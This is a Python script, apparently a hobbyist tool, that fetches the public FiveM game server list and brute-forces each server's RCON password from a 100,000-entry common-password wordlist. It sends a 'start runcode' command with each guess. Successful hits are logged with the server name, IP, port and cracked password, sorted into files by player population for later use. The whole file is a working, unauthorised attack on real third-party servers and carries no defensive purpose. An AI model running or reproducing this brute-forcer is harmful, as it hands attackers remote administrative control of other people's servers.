from pyrcon import RCON
import requests

# it is adviced that you use ANSI encoding on your wordlist text file
wordlist = 'C:/Users/stamatis/Dropbox/htdocs/bfnew/wordlists/100k-most-used-passwords-NCSC1-ANSI.txt'

# Do not edit from now on
print('--- FiveM Server List RCON Password Bruteforce by phxgg\n')
print('[INFO] Starting Script\n')

r = requests.get("https://servers-live.fivem.net/api/servers/", headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20'
})

servers = r.json()

foundServers = []

# Log found rcon
def log(hostname, ip, port, clients, response, word):
    fileName = ''

    if clients == 0:
        fileName = 'Empty.txt'
    elif clients <= 10 and not(clients == 0):
        fileName = 'LowPop.txt'
    elif clients > 10 and clients <= 20:
        fileName = 'MedPop.txt'
    elif clients > 20:
        fileName = 'HighPop.txt'

    f = open(fileName, 'a+')

    f.write('---------------- FOUND RCON ----------------\n')
    f.write('Name: %s\n' % (hostname))
    f.write('IP: %s:%d\n' % (ip, port))
    f.write('Response: %s\n' % (response))
    f.write('Password: %s\n' % (word))
    f.write('--------------------------------------------\n\n')

    f.close()

# Try password on given server
def tryServer(server, word):
    global foundServers

    serverSplit = server['EndPoint'].split(':')
    ip = serverSplit[0]
    port = int(serverSplit[1])

    if ip in foundServers:
        return
    
    print('--- Attempting %s on %s:%d' % (word, ip, port))

    rcon = RCON(ip, word, port=port)
    response = rcon.send_command('start runcode')

    if response == 'conerr':
        print('[Error] Connection error on %s:%d. Moving on...' % (ip, port))
        return

    if not(response == None):
        response = response.decode('ISO-8859-1') # readable byte decoding expert code xDDD

        if 'set rcon_password' in response:
            # server has not set a rcon password
            foundServers.append(ip) # add in the "do not check" list
            rcon.stop() # close rcon
            return
        
        if not('Invalid' in response or 'set rcon_password' in response or 'getstatus xxx' in response or 'start runcode' in response):
            print('[SUCCESS] Rcon Password for %s:%d is: %s' % (ip, port, word))
            log(server['Data']['hostname'].encode('utf-8'), ip, port, int(server['Data']['clients']), response.encode('utf-8'), word)
            foundServers.append(ip) # add in the "do not check" list
            rcon.stop() # close rcon
            return
    else:
        print('[Warning] Found NoneType byte (response timeout) for pass %s on %s:%d. Moving on...' % (word, ip, port))
        #tryServer(server, word)

with open(wordlist, encoding = "latin-1") as f:
    for word in f:

        word = word.rstrip("\n\r") # remove \n\r from passwords

        # Do not check empty passwords
        if not word:
            continue
        
        for server in servers:
            tryServer(server, word)
